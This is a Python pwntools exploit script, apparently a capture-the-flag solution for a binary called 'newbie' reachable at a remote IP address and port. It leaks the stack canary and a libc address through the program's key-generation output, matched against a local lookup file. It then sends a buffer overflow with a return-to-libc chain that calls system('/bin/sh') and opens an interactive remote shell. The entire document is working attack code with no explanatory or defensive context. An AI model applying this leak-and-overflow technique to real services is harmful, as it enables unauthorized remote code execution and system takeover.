from pwn import *

debug = 0

if(debug):
	r = process("./newbie")
	gdb.attach(r)
	libc_start_off = 0x0000000000026fc0 + 243
	sys_off = 0x000000000055410
	binsh_off = 0x1b75aa
	pop_rdi_ret_off = 0x0000000000026b72
else:
	r = remote("18.191.117.63", 31337)
	libc_start_off = 0x000000000021b10 + 231
	sys_off = 0x00000000004f550
	binsh_off = 0x1b3e1a
	pop_rdi_ret_off = 0x00000000000215bf
	ret_off = 0x00000000000008aa
r.recvuntil(b">")


data = []
f = open("data")
for line in f:
	data.append(line[:-1].split("ABCDEFGHIJKLMNOPQRSTUVWXYZ")[0])
#print(data)


# r.recvuntil(b'Incorrect Syntax')

# leak canary
canary = ""
for i in range(4):
	payload = f'id {49+i}'.encode("utf-8") 
	r.sendline(payload)
	r.recvuntil(b'>')
	
	payload = b'create'
	r.sendline(payload)
	stuff = r.recvuntil(b'>').split(b'Your key: ')[1][:32].decode("utf-8")
	for i in range(len(data)):
		if(stuff in data[i]):
			twobyte = data[i].split(":")[0]
			#print(hex(int(twobyte)))
			canary = hex(int(twobyte))[2:].zfill(4) + canary

canary = "0x" + canary
print("canary: " + canary)

# leak elf base
elf = ""
for i in range(3):
	payload = f'id {73+i}'.encode("utf-8") 
	r.sendline(payload)
	r.recvuntil(b'>')
	
	payload = b'create'
	r.sendline(payload)
	stuff = r.recvuntil(b'>').split(b'Your key: ')[1][:32].decode("utf-8")
	for i in range(len(data)):
		if(stuff in data[i]):
			twobyte = data[i].split(":")[0]
			#print(hex(int(twobyte)))
			elf = hex(int(twobyte))[2:].zfill(4) + elf

elf = "0x" + elf
#print("elf: " + elf)
libc_base = int(elf, 16) - libc_start_off
print(hex(libc_base))

system = libc_base + sys_off
binsh = libc_base + binsh_off
pop_rdi_ret = libc_base + pop_rdi_ret_off
ret = libc_base + ret_off

payload = b'quit' + b"aaaa"
payload += b'b'*10*8
payload += p64(int(canary, 16))
payload += b'\x00'*8
payload += p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system) 
r.sendline(payload)

r.interactive()